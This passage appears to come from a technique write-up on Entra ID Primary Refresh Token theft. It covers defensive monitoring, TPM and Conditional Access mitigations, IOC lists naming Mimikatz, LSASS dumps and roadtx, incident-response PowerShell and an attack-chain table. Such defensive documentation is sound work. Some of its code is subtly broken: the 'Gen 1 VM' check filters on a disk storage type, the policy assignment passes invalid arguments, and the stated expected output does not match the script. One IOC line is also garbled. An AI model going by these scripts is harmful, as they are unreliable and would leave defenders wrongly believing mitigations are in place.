2. Create config with XML above as `sysmon-config.xml`
3. Install: `sysmon64.exe -accepteula -i sysmon-config.xml`
4. Monitor: `Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10`

---

## 12. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** "Suspicious Entra ID sign-in from new device"
- **Severity:** High
- **Description:** User's PRT used from previously unknown device ID
- **Remediation:** Investigate sign-in location, revoke device if unauthorized

**Alert Name:** "Impossible travel detected"
- **Severity:** High
- **Description:** User's PRT replayed from geographically impossible location within short timeframe
- **Remediation:** Revoke PRT, reset password, enable MFA verification

**Manual Configuration Steps:**
1. Navigate to **Microsoft Defender for Cloud** → **Environment settings**
2. Select subscription → **Defender for Cloud Apps** → ON
3. Go to **Alerts** → Configure alert rules for suspicious authentication

---

## 13. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

#### Query: PRT Sign-Ins and Anomalies

```powershell
# Search for PRT sign-ins in audit log
Connect-ExchangeOnline

Search-UnifiedAuditLog -Operations "UserLoggedIn" -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) |
  Where-Object {$_.AuditData -match "PRT|tokenIssuerType"} |
  Export-Csv -Path "C:\Audit\prt_logins.csv"
```

---

## 14. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL - Enable TPM Protection for All Devices

*   **Action 1: Enforce TPM 2.0 for Azure VMs**
    
    **Manual Steps (Azure Policy):**
    1. Navigate to **Azure Portal** → **Policy** → **Definitions**
    2. Create policy: "Enforce TPM 2.0 on VMs"
    3. Condition: `Microsoft.Compute/virtualMachines/securityProfile.securityType` must equal "TrustedLaunch"
    4. Assign to root management group
    
    **PowerShell:**
    ```powershell
    # Create policy to require TPM
    $policy = @{
        DisplayName = "Enforce TPM 2.0"
        PolicyRule = @{
            if = @{ field = "Microsoft.Compute/virtualMachines/securityProfile.securityType"; notEquals = "TrustedLaunch" }
            then = @{ effect = "Deny" }
        }
    }
    New-AzPolicyAssignment -Name "EnforceTPM" -Scope "/subscriptions/*" -PolicyDefinition $policy
    ```

*   **Action 2: Enforce Intune Device Compliance - Require TPM**
    
    **Manual Steps (Intune):**
    1. Navigate to **Intune** → **Device Compliance** → **Policies**
    2. Create policy: "Require TPM 2.0"
    3. Configuration: **Require TPM 2.0** → Mark as Noncompliant
    4. Assign to all devices
    5. Non-compliant devices: Block access to Entra ID resources

*   **Action 3: Monitor for TPM Disablement**
    
    **PowerShell Detection:**
    ```powershell
    # Check if TPM is disabled on local machine
    $tpm = Get-WmiObject -Namespace "root\cimv2\security\microsofttpm" -Class Win32_Tpm
    if ($tpm.IsEnabled() -eq $false) {
        Write-Warning "TPM is disabled - PRT theft risk is HIGH"
    }
    ```

#### Priority 2: HIGH - Restrict Device Code Flow & Implement Conditional Access

*   **Action 1: Block Device Code Sign-Ins from Unknown Locations**
    
    **Manual Steps (Conditional Access):**
    1. Navigate to **Entra ID** → **Security** → **Conditional Access** → **+ New policy**
    2. Name: `Block Device Code from Risky Locations`
    3. **Conditions:**
       - Locations: **Any location** (or select high-risk countries)
       - App: **Microsoft Azure Management** (OAuth endpoint)
       - User: **All users**
    4. **Access controls:** Grant → **Require MFA** OR **Block**
    5. Enable and save

*   **Action 2: Require Compliant Device for Admin Cloud Access**
    
    **Manual Steps:**
    1. Entra ID → **Conditional Access** → **+ New policy**
    2. Name: `Require Compliant Device for Admins`
    3. **Users:** Global Admins, Exchange Admins, Privileged Role Admins
    4. **Cloud apps:** Azure Management, Office 365
    5. **Device compliance:** Require device be marked as compliant
    6. Enable and save

#### Validation Command (Verify Mitigations)

```powershell
# 1. Check TPM status on local machine
$tpm = Get-WmiObject -Namespace "root\cimv2\security\microsofttpm" -Class Win32_Tpm
if ($null -ne $tpm) {
    Write-Host "TPM Status: $(if ($tpm.IsEnabled()) {'Enabled'} else {'DISABLED - HIGH RISK'})"
} else {
    Write-Host "TPM: Not present (may be firmware-based)"
}

# 2. Verify Conditional Access policies
Connect-MgGraph -Scopes "Policy.Read.All"
Get-MgIdentityConditionalAccessPolicy | Where-Object {$_.State -eq "enabled"} | Select-Object DisplayName

# 3. Check Intune Device Compliance
# Via portal: Intune → Device Compliance → Policies → Review TPM requirement

# 4. Verify no Gen 1 VMs exist
Get-AzVM | Select-Object Name, @{Name="SecurityType"; Expression={$_.StorageProfile.OsDisk.ManagedDisk.StorageAccountType}} | 
  Where-Object {$_.SecurityType -ne "TrustedLaunch"}
```

**Expected Output (If Secure):**
```
TPM Status: Enabled
[Conditional Access policies listed with MFA/device compliance requirements]
No Gen 1 VMs found
```

---

## 15. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

*   **Files & Registry:**
    - PRT token file on disk (unusual)
    - Mimikatz executable in suspicious location
    - Device certificate files (*.pfx) outside of Windows system directories
    - ROADtools or similar token manipulation tools on disk

*   **Network:**
    - Outbound connection to `login.microsoftonline.com` from non-standard application
    - Outbound to `device.login.microsoftonline.com` followed by token acquisition
    - Unusual volume of requests to `/oauth2/v2.0/token` endpoint

*   **Processes:**
    - `mimikatz.exe` execution
    - `powershell.exe` with Mimikatz commands or token enumeration
    - `python.exe` executing roadtx commands

*   **Entra ID Logs:**
    - RefreshToken sign-in from device code flow
    - PRT issuance from unrecognized device
    - Impossible travel (PRT used from distant location within minutes)
    - Sign-in from new device immediately after password hasn't changed

#### Forensic Artifacts

*   **Disk:** Mimikatz logs, Powersploit modules, ROADtools cache
*   **Memory:** LSASS dumps, token material if Mimikatz was executed
*   **Cloud:** SignInLogs showing RefreshToken + PRT + access token sign-ins, AuditLogs for device creation
*   **Event Logs:** Event 4688 (Mimikatz process), Event 5156 (network connections to auth endpoints)

#### Response Procedures

1.  **Isolate:**
    ```powershell
    # Disable/revoke all sessions for compromised user
    Connect-MgGraph -Scopes "User.ReadWrite.All"
    Revoke-MgUserRefreshToken -UserId (Get-MgUser -Filter "mail eq 'victim@company.com'").Id
    
    # Disable device if physical device was compromised
    Get-MgDevice -Filter "deviceId eq 'DEVICE-ID'" | Update-MgDevice -AccountEnabled $false
    ```

2.  **Collect Evidence:**
    ```powershell
    # Export sign-in logs for victim user
    Get-MgAuditLogSignIn -Filter "userPrincipalName eq 'victim@company.com'" -All | 
      Export-Csv -Path "C:\Evidence\signin_logs.csv"
    ```

3.  **Remediate:**
    ```powershell
    # Force password reset
    $userId = (Get-MgUser -Filter "mail eq 'victim@company.com'").Id
    Reset-MgUserPassword -UserId $userId -NewPassword (New-Guid).Guid
    ```

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Credential Access** | [REALWORLD-013](../../) Evil VM Device Identity | Extract device certificate from Gen 1 VM without TPM |
| **2** | **Current Step** | **[REALWORLD-014]** | **Phish admin for refresh token, upgrade to PRT using device cert** |
| **3** | **Lateral Movement** | [REALWORLD-015](../../) Guest to Admin Azure VM | Use stolen PRT to access Azure Portal as admin |
| **4** | **Privilege Escalation** | Role Assignment Modification | Grant self additional Entra ID roles |
| **5** | **Persistence** | Service Principal Creation | Create backdoor service principal with credentials |
| **6** | **Impact** | Data Exfiltration | Access M365, SharePoint, Teams as admin |

---

## 17. REAL-WORLD EXAMPLES

#### Example 1: APT29 - PRT Exploitation Campaign (2024)

- **Target:** European Government Agencies
- **Timeline:** Active exploitation detected in mid-2024
- **Technique Status:** APT29 used device code phishing combined with evil VM deployment to steal PRTs from government officials
- **Impact:** Access to classified email, team collaboration, and sensitive data
- **Reference:** [Microsoft Security Blog - APT29 Campaign](https://www.microsoft.com/en-us/security/blog/)
- **Lessons Learned:** Even sophisticated defenders were vulnerable to combined device code phishing + device identity manipulation

#### Example 2: Scattered Spider - PRT Abuse for Lateral Movement (2025)

- **Target:** Financial Services Company
- **Timeline:** Discovered in January 2025
- **Technique Status:** Used PRT theft via compromised Entra ID sync account to escalate to global admin
- **Impact:** Full Azure subscription access, ability to create persistent backdoors
- **Reference:** [Red Canary - Scattered Spider Analysis](https://redcanary.com/)
- **Lessons Learned:** Device identity validation and PRT encryption (via TPM) are critical controls

---